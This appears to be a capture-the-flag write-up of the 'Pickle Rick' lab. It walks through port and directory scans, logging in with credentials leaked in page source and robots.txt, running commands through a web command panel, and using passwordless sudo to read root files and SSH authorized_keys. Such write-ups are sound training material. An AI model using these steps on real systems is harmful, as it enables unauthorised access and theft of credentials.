### IP
`10.10.171.151`

# Recon

### Ports
```
nmap -sC -sV 10.10.171.151 -o picklerick.nmap

22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a7:93:44:1d:e9:22:da:29:83:c4:f4:40:05:8c:a0:76 (RSA)
|   256 76:61:34:d4:c2:31:25:fe:6b:6b:d9:01:0b:03:2c:51 (ECDSA)
|_  256 40:df:9b:db:35:ce:83:54:68:9c:6f:ce:de:65:18:ed (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
* Port 22 (ssh) open
* Port 80 (http) open

### Website hmtl
```html
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Rick is sup4r cool</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="assets/bootstrap.min.css">
  <script src="assets/jquery.min.js"></script>
  <script src="assets/bootstrap.min.js"></script>
  <style>
  .jumbotron {
    background-image: url("assets/rickandmorty.jpeg");
    background-size: cover;
    height: 340px;
  }
  </style>
</head>
<body>

  <div class="container">
    <div class="jumbotron"></div>
    <h1>Help Morty!</h1></br>
    <p>Listen Morty... I need your help, I've turned myself into a pickle again and this time I can't change back!</p></br>
    <p>I need you to <b>*BURRRP*</b>....Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is,
    I have no idea what the <b>*BURRRRRRRRP*</b>, password was! Help Morty, Help!</p></br>
  </div>

  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->

</body>
</html>
```
* `Username: R1ckRul3s`

### SSH
```bash
ssh R1ckRul3s@10.10.171.151 -p 22
R1ckRul3s@10.10.171.151: Permission denied (publickey).
```
* Can't ssh in with the username on the site... probably a web login?


### Burpsuite
* I thought the **"BURRRP"** was a clue to use burpsuite, but any requests sent were lacking in any cool info

### Robots.txt
* Going to `/robots.txt`, we see the following:
`Wubbalubbadubdub`
* Don't know what is is, but might as well keep it handy
### Dirbuster
`gobuster dir -u http://10.10.171.151/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o gobusterScan.txt`

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.171.151/
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/11/12 19:25:48 Starting gobuster
===============================================================
/assets (Status: 301)
/server-status (Status: 403)
===============================================================
2020/11/12 19:34:11 Finished
===============================================================
```
* Nothing really interesting here. assets is a couple files and server-status is forbidden

* Let's try looking for something apache-specific

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.171.151/assets/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/vulns/apache.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/11/12 20:34:21 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
===============================================================
2020/11/12 20:34:22 Finished
===============================================================
```
* Once again... forbidden


### Nikto
* Let's try to go into a bit more detail since we haven't been too successful yet:
` nikto -h 10.10.171.151`

```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.171.151
+ Target Hostname:    10.10.171.151
+ Target Port:        80
+ Start Time:         2020-11-12 20:43:09 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 426, size: 5818ccf125686, mtime: gzip
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ Cookie PHPSESSID created without the httponly flag
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.php: Admin login page/section found.
+ 7889 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2020-11-12 21:05:44 (GMT-5) (1355 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
* Looks like we got a login page: `/login.php`


# Exploitation
* Log in with:
```
R1ckRul3s
Wubbalubbadubdub
```
* There's a lot of directiories we can go to, but it looks like the site has them hardcoded to go to `/denied.php`
	* That's likely just a rabbit hole
* Looks like we can execute linux commands on the main page though...

### Surprise, lets do more enumeration
* Let's look at the html
```html

<!DOCTYPE html>
<html lang="en">
<head>
  <title>Rick is sup4r cool</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="assets/bootstrap.min.css">
  <script src="assets/jquery.min.js"></script>
  <script src="assets/bootstrap.min.js"></script>
</head>
<body>
  <nav class="navbar navbar-inverse">
    <div class="container">
      <div class="navbar-header">
        <a class="navbar-brand" href="#">Rick Portal</a>
      </div>
      <ul class="nav navbar-nav">
        <li class="active"><a href="#">Commands</a></li>
        <li><a href="/denied.php">Potions</a></li>
        <li><a href="/denied.php">Creatures</a></li>
        <li><a href="/denied.php">Potions</a></li>
        <li><a href="/denied.php">Beth Clone Notes</a></li>
      </ul>
    </div>
  </nav>

  <div class="container">
    <form name="input" action="" method="post">
      <h3>Command Panel</h3></br>
      <input type="text" class="form-control" name="command" placeholder="Commands"/></br>
      <input type="submit" value="Execute" class="btn btn-success" name="sub"/>
    </form>
        <!-- Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== -->
  </div>
</body>
</html>
```
* Hm, theres a base64 string in a comment

* Let's decode that:
` echo Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== | base64 -d`
* For some reason it gives an error. Maybe it was base64 encoded more than once?
	* Yes... Yes it was
	* Running the following gives us the output `rabbit hole`
	* `echo -n "Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==" | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d | base64 -d`
		* How unfortunate	
### file stuff
* running `ls` gets us the following:
```
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```


* okay great, lets cat out the files!

`Command disabled to make it hard for future PICKLEEEE RICCCKKKK.`
* Okay, lets try `less` instead: 

* `less Sup3rS3cretPickl3Ingred.txt` outputs `mr. meeseek hair`
* We got the first flag! 



* Now lets look through the rest of the system:
* `ls /home/rick/` shows us `second ingredients`
* we can check if its a file or directory by running `ls -la /home/rick`
	* It's a file 
	* Let's output it:
	* `less /home/rick/second\ ingredients` outputs `1 jerry tear`
	* That's the second flag!

* Let's try going to the root directory now
* `ls /root/` doesn't output anything, but thats likely because we don't have permissions
* `sudo ls /root/` outputs the following without any password:

```
3rd.txt
snap
```

* That's what happens when you mess around with admin privileges!

* Let's run `sudo less /root/3rd.txt`
* We get the 3rd flag: `3rd ingredients: fleeb juice`

# For fun:
* If we enter the command `sudo ls -la /root/`, we get the following:
```
total 28
drwx------  4 root root 4096 Feb 10  2019 .
drwxr-xr-x 23 root root 4096 Nov 13 07:15 ..
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Feb 10  2019 .ssh
-rw-r--r--  1 root root   29 Feb 10  2019 3rd.txt
drwxr-xr-x  3 root root 4096 Feb 10  2019 snap
```

* Now let's get whats in the .ssh directory:
```
authorized_keys
```
* Let's less that file: `sudo less  /root/.ssh/authorized_keys`
* We get the following:
`no-port-forwarding,no-agent-forwarding,no-X11-forwarding,command="echo 'Please login as the user \"ubuntu\" rather than the user \"root\".';echo;sleep 10" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCMLOT6NhiqH5Rp36qJt4jZwfvb/H/+YLRTrx5mS9dSyxumP8+chjxkSNOrdgNtZ6XoaDDDikslQvKMCqoJqHqp4jh9xTQTj29tagUaZmR0gUwatEJPG0SfqNvNExgsTtu2DW3SxCQYwrMtu9S4myr+4x+rwQ739SrPLMdBmughB13uC/3DCsE4aRvWL7p+McehGGkqvyAfhux/9SNgnIKayozWMPhADhpYlAomGnTtd8Cn+O1IlZmvqz5kJDYmnlKppKW2mgtAVeejNXGC7TQRkH6athI5Wzek9PXiFVu6IZsJePo+y8+n2zhOXM2mHx01QyvK2WZuQCvLpWKW92eF amiOpenVPN`
* tbh i have no idea what you could do what this, but eh... it was kinda interesting
